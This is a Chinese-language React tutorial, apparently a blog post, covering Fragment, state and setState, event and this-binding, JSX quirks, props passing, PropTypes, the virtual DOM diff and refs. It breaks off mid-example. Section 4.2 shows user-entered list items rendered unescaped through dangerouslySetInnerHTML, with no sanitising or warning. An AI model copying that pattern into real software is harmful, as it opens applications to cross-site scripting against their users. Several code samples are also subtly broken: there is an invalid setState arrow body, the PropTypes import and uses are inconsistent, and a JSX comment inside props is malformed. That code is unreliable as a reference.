<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;	</span><br><span class="line">	&lt;div&gt;</span><br><span class="line">		&lt;input value=&#123;this.state.inputValue&#125; onChange=&#123;this.handlerInputChange&#125;/&gt;</span><br><span class="line">		&lt;button className=&apos;red-btn&apos; onClick=&#123;this.handlerBtnClick&#125;&gt;add&lt;/button&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">	&lt;ul&gt;</span><br><span class="line">		&lt;li&gt;学英语&lt;/li&gt;</span><br><span class="line">		&lt;li&gt;学汉语&lt;/li&gt;</span><br><span class="line">	&lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>在react16的版本中，提供了一个叫做<code>Fragment</code>的占位符，这样就不会出现多余的外层div了</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//如果没有这句话，只能使用&lt;React.Fragment&gt;</span></span><br><span class="line"><span class="keyword">import</span> React, &#123; Component , Fragment &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line">。。。</span><br><span class="line"></span><br><span class="line">。。。</span><br><span class="line">&lt;Fragment&gt;	</span><br><span class="line">	&lt;div&gt;</span><br><span class="line">		&lt;input value=&#123;<span class="keyword">this</span>.state.inputValue&#125; onChange=&#123;<span class="keyword">this</span>.handlerInputChange&#125;/&gt;</span><br><span class="line">		&lt;button className=<span class="string">'red-btn'</span> onClick=&#123;<span class="keyword">this</span>.handlerBtnClick&#125;&gt;add&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">	&lt;/</span>div&gt;</span><br><span class="line">	&lt;ul&gt;</span><br><span class="line">		&lt;li&gt;学英语&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">		&lt;li&gt;学汉语&lt;/</span>li&gt;</span><br><span class="line">	&lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>Fragment&gt;</span><br></pre></td></tr></table></figure>
<h3 id="2、React中响应式设计思想"><a href="#2、React中响应式设计思想" class="headerlink" title="2、React中响应式设计思想"></a>2、React中响应式设计思想</h3><p>​    react不直接操作dom来响应页面，而是操作数据，让react自动来响应布局。</p>
<p>​    react如何创建数据呢？</p>
<p>2.1首先需要在组件的构造函数中声明状态，然后把数据定义在这个状态中</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">constructor</span>(props)&#123;</span><br><span class="line">	<span class="keyword">super</span>(props);</span><br><span class="line">    <span class="comment">//this.state就是组件的状态</span></span><br><span class="line">	<span class="keyword">this</span>.state=&#123;</span><br><span class="line">		list:[],</span><br><span class="line">		inputValue:<span class="string">""</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2.2然后让标签和状态里中数据做一个绑定，该怎么做呢？</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//比如input中的值是有value属性决定的，就可以如下和数据绑定</span></span><br><span class="line">&lt;input value=&#123;<span class="keyword">this</span>.state.inputValue&#125; /&gt;</span><br></pre></td></tr></table></figure>
<p>这样input标签就与状态中的inputValue数据绑定在了一起</p>
<h3 id="3、React中事件绑定"><a href="#3、React中事件绑定" class="headerlink" title="3、React中事件绑定"></a>3、React中事件绑定</h3><p>​    原生的标签事件绑定都是使用的小写字母，在react 中必须使用驼峰式的规则。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;input value=&#123;<span class="keyword">this</span>.state.inputValue&#125; onchange=...&gt;</span><br><span class="line"><span class="comment">//必须改为</span></span><br><span class="line">&lt;input value=&#123;<span class="keyword">this</span>.state.inputValue&#125; onChange=.../&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在jsx的语法里使用表达式，必须将表达式包括在打括号中，其中handlerInputChange函数在组件内定义，与render方法平行</span></span><br><span class="line">&lt;input value=&#123;<span class="keyword">this</span>.state.inputValue&#125; onChange=&#123;<span class="keyword">this</span>.handlerInputChange&#125;/&gt;</span><br></pre></td></tr></table></figure>
<p>注意此时在handlerInputChange函数中直接使用this.state会报错，显示this指向为undefined，这是由于此处this指向的是input标签，而不是该组件类，如果让它执行该组件类呢，需要绑定this</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这是在handlerInputChange函数中直接使用this了</span></span><br><span class="line">&lt;input value=&#123;<span class="keyword">this</span>.state.inputValue&#125; onChange=&#123;<span class="keyword">this</span>.handlerInputChange.bind(<span class="keyword">this</span>)&#125;/&gt;</span><br></pre></td></tr></table></figure>
<p>为了书写的简洁，可以对所有的函数在constructor中进行this的绑定，这样在标签中就不用书写bind语法了。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">constructor</span>(props)&#123;</span><br><span class="line">		<span class="keyword">super</span>(props);</span><br><span class="line">		<span class="keyword">this</span>.state=&#123;</span><br><span class="line">			list:[],</span><br><span class="line">			inputValue:<span class="string">""</span></span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="keyword">this</span>.handlerInputChange=<span class="keyword">this</span>.handlerInputChange.bind(<span class="keyword">this</span>);</span><br><span class="line">		<span class="keyword">this</span>.handlerBtnClick=<span class="keyword">this</span>.handlerBtnClick.bind(<span class="keyword">this</span>);</span><br><span class="line">		<span class="keyword">this</span>.handlerDelete=<span class="keyword">this</span>.handlerDelete.bind(<span class="keyword">this</span>);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">//注意改变state中的数据，不能直接使用this.state进行改变，必须使用this.setState方法操作 </span></span><br><span class="line">handlerInputChange(event)&#123;</span><br><span class="line">		<span class="keyword">this</span>.setState(&#123;</span><br><span class="line">			inputValue:event.target.value</span><br><span class="line">		&#125;);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">render() &#123;</span><br><span class="line">	    <span class="keyword">return</span> (</span><br><span class="line">		    	&lt;Fragment&gt;</span><br><span class="line">		      &lt;div&gt;</span><br><span class="line">		      	&lt;input value=&#123;<span class="keyword">this</span>.state.inputValue&#125; onChange=&#123;<span class="keyword">this</span>.handlerInputChange&#125;/&gt;</span><br><span class="line">		      	&lt;button className=<span class="string">'red-btn'</span> onClick=&#123;<span class="keyword">this</span>.handlerBtnClick&#125;&gt;add&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">		      &lt;/</span>div&gt;</span><br><span class="line">		      &lt;ul&gt;&#123;<span class="keyword">this</span>.getTodoItems()&#125;&lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">		   &lt;/</span>Fragment&gt;</span><br><span class="line">	    );</span><br><span class="line">	  &#125;</span><br></pre></td></tr></table></figure>
<p>每一个标签最好有一个key值，特别是当多个相同的标签同时使用时。</p>
<p>在react中，不允许直接改变state的数据，必须通过setState来改变</p>
<h3 id="4、jsx"><a href="#4、jsx" class="headerlink" title="4、jsx"></a>4、jsx</h3><h4 id="4-1-jsx中写注释"><a href="#4-1-jsx中写注释" class="headerlink" title="4.1 jsx中写注释"></a>4.1 jsx中写注释</h4><p>在jsc语法中写注释需要将注释放在大括号中</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">render() &#123;</span><br><span class="line">	    <span class="keyword">return</span> (</span><br><span class="line">		    &lt;Fragment&gt;</span><br><span class="line">            	&#123;<span class="comment">/*下面是div*/</span>&#125;</span><br><span class="line">            	&#123;<span class="comment">//下面是div&#125;</span></span><br><span class="line">		      &lt;div&gt;</span><br><span class="line">		      	&lt;input value=&#123;<span class="keyword">this</span>.state.inputValue&#125; onChange=&#123;<span class="keyword">this</span>.handlerInputChange&#125;/&gt;</span><br><span class="line">		      	&lt;button className=<span class="string">'red-btn'</span> onClick=&#123;<span class="keyword">this</span>.handlerBtnClick&#125;&gt;add&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">		      &lt;/</span>div&gt;</span><br><span class="line">		      &lt;ul&gt;&#123;<span class="keyword">this</span>.getTodoItems()&#125;&lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">		   &lt;/</span>Fragment&gt;</span><br><span class="line">	    );</span><br><span class="line">	  &#125;</span><br></pre></td></tr></table></figure>
<h4 id="4-2-jsx中如果不希望对字符串转义"><a href="#4-2-jsx中如果不希望对字符串转义" class="headerlink" title="4.2 jsx中如果不希望对字符串转义"></a>4.2 jsx中如果不希望对字符串转义</h4><p>例如输入“</p><h1>hello </h1>”，不希望在页面输出“<h1>hello </h1>”，而是直接显示“hello”，此时可以使用dangerouslySetInnerHTML<p></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">getTodoItems()&#123;</span><br><span class="line">		return (</span><br><span class="line">			this.state.list.map((item,index) =&gt; &#123;</span><br><span class="line">		      		return (</span><br><span class="line">		      			&lt;Item </span><br><span class="line">		      				delete=&#123;this.handlerDelete&#125; </span><br><span class="line">		      				key=&#123;index&#125; </span><br><span class="line">		      				&#123;//表示解析item中的html标签，不被转义&#125;</span><br><span class="line">		      				dangerouslySetInnerHTML=&#123;&#123;__html:item&#125;&#125;</span><br><span class="line">		      				index=&#123;index&#125;</span><br><span class="line">		      			/&gt;</span><br><span class="line">		      		)</span><br><span class="line">		      &#125;)</span><br><span class="line">		);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<h4 id="4-3-光标的聚焦"><a href="#4-3-光标的聚焦" class="headerlink" title="4.3 光标的聚焦"></a>4.3 光标的聚焦</h4><p>在html中，可以使用label标签做聚焦，例如想通过点击某一文字让光标聚焦在input中，本来使用for属性，就可以，但是在jsx语法中需要使用htmlFor属性来代替</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">render() &#123;</span><br><span class="line">	    <span class="keyword">return</span> (</span><br><span class="line">		    &lt;Fragment&gt;</span><br><span class="line">		      &lt;div&gt;</span><br><span class="line">            	&#123;<span class="comment">//给htmlFor传递某标签的id即可&#125;</span></span><br><span class="line">            	&lt;label htmlFor=<span class="string">"insertArea"</span> &gt;哈哈哈&lt;<span class="regexp">/label&gt;</span></span><br><span class="line"><span class="regexp">		      	&lt;input id="insertArea" value=&#123;this.state.inputValue&#125; onChange=&#123;this.handlerInputChange&#125;/</span>&gt;</span><br><span class="line">		      	&lt;button className=<span class="string">'red-btn'</span> onClick=&#123;<span class="keyword">this</span>.handlerBtnClick&#125;&gt;add&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">		      &lt;/</span>div&gt;</span><br><span class="line">		      &lt;ul&gt;&#123;<span class="keyword">this</span>.getTodoItems()&#125;&lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">		   &lt;/</span>Fragment&gt;</span><br><span class="line">	    );</span><br><span class="line">	  &#125;</span><br></pre></td></tr></table></figure>
<h4 id="4-4-组件数据的传递"><a href="#4-4-组件数据的传递" class="headerlink" title="4.4 组件数据的传递"></a>4.4 组件数据的传递</h4><p>父组件可以通过属性想子组件传递信息</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//TodoList组件</span></span><br><span class="line">。。。</span><br><span class="line">getTodoItems()&#123;</span><br><span class="line">		<span class="keyword">return</span> (</span><br><span class="line">			<span class="keyword">this</span>.state.list.map(<span class="function">(<span class="params">item,index</span>) =&gt;</span> &#123;</span><br><span class="line">		      		<span class="keyword">return</span> (</span><br><span class="line">		      			&lt;Item </span><br><span class="line">		      				<span class="keyword">delete</span>=&#123;<span class="keyword">this</span>.handlerDelete&#125; </span><br><span class="line">		      				key=&#123;index&#125; </span><br><span class="line">		      				content=&#123;item&#125; </span><br><span class="line">		      				index=&#123;index&#125;</span><br><span class="line">		      			/&gt;</span><br><span class="line">		      		)</span><br><span class="line">		      &#125;)</span><br><span class="line">		);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//item组件</span></span><br><span class="line">。。。</span><br><span class="line">render()&#123;</span><br><span class="line">		<span class="keyword">const</span> &#123;content&#125;=<span class="keyword">this</span>.props;</span><br><span class="line">		<span class="keyword">return</span> (</span><br><span class="line">			&lt;div onClick=&#123;<span class="keyword">this</span>.handlerDelete&#125;&gt;&#123;content&#125;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">		)</span></span><br><span class="line"><span class="regexp">	&#125;</span></span><br></pre></td></tr></table></figure>
<p>子组件想要调用父组件中的方法，可以在父组件中通过属性将父组件中的方法传递给子组件，供子组件调用</p>
<p>代码同上，注意需要绑定父组件的this</p>
<h4 id="4-5-setState参数"><a href="#4-5-setState参数" class="headerlink" title="4.5 setState参数"></a>4.5 setState参数</h4><p>在使用setState改变状态数据时，可以设置一个参数为prevState表示上一个状态的数据</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">handlerDelete(index)&#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(<span class="function">(<span class="params">prevState</span>)=&gt;</span>(&#123;</span><br><span class="line">        <span class="keyword">const</span> list=[...prevState.list];</span><br><span class="line">        list.splice(index,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> &#123;list&#125;;</span><br><span class="line">    &#125;));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong>父组件可以向子组件传值，但是子组件不能改变这个值，这就是react中单向数据流的概念。如果非要在子组件中修改这个值，可以通过父组件传给子组件的方法来操作。</p>
<h4 id="4-6、子组件的传值"><a href="#4-6、子组件的传值" class="headerlink" title="4.6、子组件的传值"></a>4.6、子组件的传值</h4><p>react中子组件间的传值会非常复杂，因此建议使用其它框架或方法完成子组件间的值传递。这也是react只是视图层框架的原因。</p>
<h3 id="5深入React"><a href="#5深入React" class="headerlink" title="5深入React"></a>5深入React</h3><h4 id="5-1-chrome的react调试"><a href="#5-1-chrome的react调试" class="headerlink" title="5.1 chrome的react调试"></a>5.1 chrome的react调试</h4><p>安装扩展React Developer Tools</p>
<h4 id="5-2-PropTypes和DefaultProps"><a href="#5-2-PropTypes和DefaultProps" class="headerlink" title="5.2 PropTypes和DefaultProps"></a>5.2 PropTypes和DefaultProps</h4><p>虽然子组件可以接受父组件传来的属性，但是子组件如果不能定义该属性的类型的话，就容易发生错误。此时需要对属性做校验，例如对Item组件添加组件交验：</p>
<ul>
<li>首先引入PropTypes</li>
<li>然后在代码中添加属性类型校验</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125;<span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> PropsTypes <span class="keyword">from</span> <span class="string">'prop-types'</span>;<span class="comment">//引入包</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Item</span> <span class="keyword">extends</span> <span class="title">Component</span></span>&#123;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义子组件接受属性的类型校验</span></span><br><span class="line">Item.propTypes=&#123;</span><br><span class="line">    content:PropTypes.string,<span class="comment">//限定父组件传来的属性content必须是字符串</span></span><br><span class="line">    <span class="keyword">delete</span>:PropTypes.func,<span class="comment">//限定父组件传来的属性delete必须是函数</span></span><br><span class="line">    index:propTypes.number,<span class="comment">//限定父组件传来的属性index必须是数字</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Item;</span><br></pre></td></tr></table></figure>
<p>这样的话，如果父组件传来的属性不符合要求的话，就会给出明显的错误提示。</p>
<p><strong>注意：</strong>如果在子组件中为某属性定义了某一类型，并且还使用了该属性，但是父组件没有传递该属性，程序是不会报错的。如果想改变这种情况，可以在类型校验中添加isRequired</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义子组件接受属性的类型校验</span></span><br><span class="line">Item.propTypes=&#123;</span><br><span class="line">    test:PropTypes.string.isRequired,<span class="comment">//test为字符串，且必须传递，否则或报错警报</span></span><br><span class="line">    content:PropTypes.string,</span><br><span class="line">    <span class="keyword">delete</span>:PropTypes.func,</span><br><span class="line">    index:PropTypes.number,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时父组件必须给子组件传递test的属性，不传递就会报错。但是想要如果父组件不传递时给test一个默认值，如何处理呢，此时就用到了<strong>DefaultProps</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Item.propTypes=&#123;</span><br><span class="line">    test:PropTypes.string.isRequired,<span class="comment">//test为字符串，且必须传递，否则或报错警报</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这是test是必传的，如果不传，则使用默认值。</span></span><br><span class="line">Item.defaultProps=&#123;</span><br><span class="line">    test:<span class="string">"hello world"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当然还有很多高级的应用，比如允许一个属性既可以是字符串也可以是数字,可以使用PropsTypes.oneOfType([PropTypes.number,PropTypes.string])，详情请见<a href="https://reactjs.org/docs/typechecking-with-proptypes.html" target="_blank" rel="noopener">https://reactjs.org/docs/typechecking-with-proptypes.html</a></p>
<h4 id="5-3-Props、State和render函数"><a href="#5-3-Props、State和render函数" class="headerlink" title="5.3 Props、State和render函数"></a>5.3 Props、State和render函数</h4><p>当组件的props或state发生改变的时候，render函数就会重新执行。</p>
<p>所以当你输入input时会触发handlerInputChange 函数；而handlerInputChange 函数里面改变了state的状态，进而引起render函数的重新执行，这时render就可以拿到state中新的数据来渲染。</p>
<p>当父组件的render函数被运行时，它的子组件的render都将被重新运行。</p>
<p>react中频繁的重绘，得益于它有虚拟dom</p>
<h3 id="6-React中的虚拟dom"><a href="#6-React中的虚拟dom" class="headerlink" title="6 React中的虚拟dom"></a>6 React中的虚拟dom</h3><h4 id="6-1-虚拟dom"><a href="#6-1-虚拟dom" class="headerlink" title="6.1 虚拟dom"></a>6.1 虚拟dom</h4><p>假设让我们来实现虚拟dom，会有哪些步骤呢？</p>
<blockquote>
<p>1、stateshju</p>
<p>2、JSX模版</p>
<p>3、数据+模版，结合生成真实的dom，进行展示</p>
<p>4、state 发生改变</p>
<p>5、数据+模版，结合生成真实的dom，进行展示</p>
</blockquote>
<p>常规思路就这样，但是这样会有什么问题呢？</p>
<p>缺陷：</p>
<p>第一次生成一个完整的dom片段，第二次也生成一个完整的dom片段，然后第二次的dom替换第一次的dom，非常消耗性能</p>
<p>如何改良呢？</p>
<blockquote>
<p>1、stateshju</p>
<p>2、JSX模版</p>
<p>3、数据+模版，结合生成真实的dom，进行展示</p>
<p>4、state 发生改变</p>
<p>5、数据+模版，结合生成真实的dom，并不直接替换原始的dom</p>
<p>6、新的dom和原始dom做比较，找差异</p>
<p>7、找出input框发生变化，</p>
<p>8、只用新的dom中的input元素，替换掉老dom中的input元素</p>
</blockquote>
<p>此时虽然有省去了dom替换的性能，但是增加了新老dom做比较的性能。此时性能的提升并不明显。</p>
<p>而react怎么做的呢（操作dom消耗性能很大，但是操作js对象不消耗性能）</p>
<blockquote>
<p>1、stateshju</p>
<p>2、JSX模版</p>
<p>3、生成虚拟dom（虚拟dom是一个js对象，用它来描述真实dom）</p>
<p><code>[&quot;div&quot;,{id:&quot;abc&quot;},[&quot;span&quot;,{},&quot;hello world&quot;]]</code></p>
<p>4、用虚拟dom的结构生成真实的dom，进行展示</p>
<p><code>&lt;div id=“abc”&gt;&lt;span&gt;hello world&lt;/span&gt;&lt;/div&gt;</code></p>
<p>5、state 发生变化</p>
<p>6、数据+模版 生成新的虚拟dom</p>
<p><code>[&quot;div&quot;,{id:&quot;abc&quot;},[&quot;span&quot;,{},&quot;byebye&quot;]]</code></p>
<p>7、比较原始虚拟dom和新的虚拟dom的区别，找到区别是span中的内容（比较js对象不消耗性能）</p>
<p>8、直接操作dom，改变span中的内容</p>
</blockquote>
<h4 id="6-2-render中的流程"><a href="#6-2-render中的流程" class="headerlink" title="6.2 render中的流程"></a>6.2 render中的流程</h4><p>render函数中的JSX模版，会先转化成js对象（虚拟dom），再转化为真实dom。</p>
<p>所以render中返回的看似htnl标签，其实不是，它是jsx模版。</p>
<p>假如render函数如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">render()&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    <span class="comment">//return &lt;div&gt;&lt;span&gt;hello&lt;/span&gt;&lt;/div&gt;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//效果等同于</span></span><br><span class="line">render()&#123;</span><br><span class="line">    <span class="keyword">return</span> React.createElement(<span class="string">"div"</span>,&#123;&#125;,<span class="string">"hello"</span>);</span><br><span class="line">    <span class="comment">//return React.createElement("div",&#123;&#125;,React.createElement("span",&#123;&#125;,"hello"));</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实际上React.createElement是更偏向于底层的一个接口。而上边的返回div的真实流程是</p>
<p>jsx 调用createElement，转化为虚拟dom（js对象），生成真实dom.</p>
<p>但是当我们的结构比较复杂时 ，调用createElement就会显得更加混乱，而jsx语法就是为了简洁，方便写代码。</p>
<p>虚拟dom有什么好处呢？</p>
<blockquote>
<p>1、性能提升 dom的比较变成了js对象的比较</p>
<p>2、它使得跨端应用得以实现，react native（可以将虚拟dom 生成原生组件）</p>
</blockquote>
<h4 id="6-3-react中虚拟dom的diff算法"><a href="#6-3-react中虚拟dom的diff算法" class="headerlink" title="6.3 react中虚拟dom的diff算法"></a>6.3 react中虚拟dom的diff算法</h4><p>react是如何比较新旧虚拟都没的呢？diff算法</p>
<p>要么state改变，要么props改变（其实props改变也会state），就会触发虚拟dom的比对。</p>
<p>什么时候数据会发生变化，都是调用setState时数据才发生变化。</p>
<p>setState是异步的，如果你连续快速调用三次setState，那么react会把这三次setState合并成一个setState，只需进行一次虚拟dom的比对，这样就不会造成浪费了</p>
<p>diff的比对，遵循<strong>同层比对</strong>，若此层dom有差别，则不会再比较下层dom。</p>
<p>下面说一下为什么在for循环中，为啥不要使用index作为key值，通过key值可以建立组件一对一的关联，如果使用index作为key时，当仅仅是删除一项时，会带动剩下所有组件key值的变化，相当于重新组装了所有的组件；如果使用另一种唯一值作为key值，即使删除某一项，剩余项的key值也不会发生改变，此时dom只需删除被删除的那一项即可。</p>
<h3 id="7、react中ref的使用"><a href="#7、react中ref的使用" class="headerlink" title="7、react中ref的使用"></a>7、react中ref的使用</h3><p>ref是帮助在react中直接获取dom元素的，实际上<strong>不推荐使用ref</strong>。</p>
<p>如何使用ref，先看原来的input框流程</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">render() &#123;</span><br><span class="line">	    <span class="keyword">return</span> (</span><br><span class="line">		    	&lt;Fragment&gt;</span><br><span class="line">		      &lt;div&gt;</span><br><span class="line">		      	&lt;input value=&#123;<span class="keyword">this</span>.state.inputValue&#125; onChange=&#123;<span class="keyword">this</span>.handlerInputChange&#125;/&gt;</span><br><span class="line">		      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">		      &lt;ul&gt;&#123;this.getTodoItems()&#125;&lt;/u</span>l&gt;</span><br><span class="line">		   &lt;<span class="regexp">/Fragment&gt;</span></span><br><span class="line"><span class="regexp">	    );</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">handlerInputChange(event)&#123;</span></span><br><span class="line"><span class="regexp">		/</span><span class="regexp">/console.log(event.target.value);</span></span><br><span class="line"><span class="regexp">		this.setState(&#123;</span></span><br><span class="line"><span class="regexp">			inputValue:event.target.value</span></span><br><span class="line"><span class="regexp">		&#125;);</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure>
<p>此时我们是通过event.target来获取数据的，而ref就可以不通过event来获取数据，而是直接通过input来获取数据，怎么做呢？</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">render() &#123;</span><br><span class="line">	    <span class="keyword">return</span> (</span><br><span class="line">		    	&lt;Fragment&gt;</span><br><span class="line">		      &lt;div&gt;</span><br><span class="line">		      	&lt;input 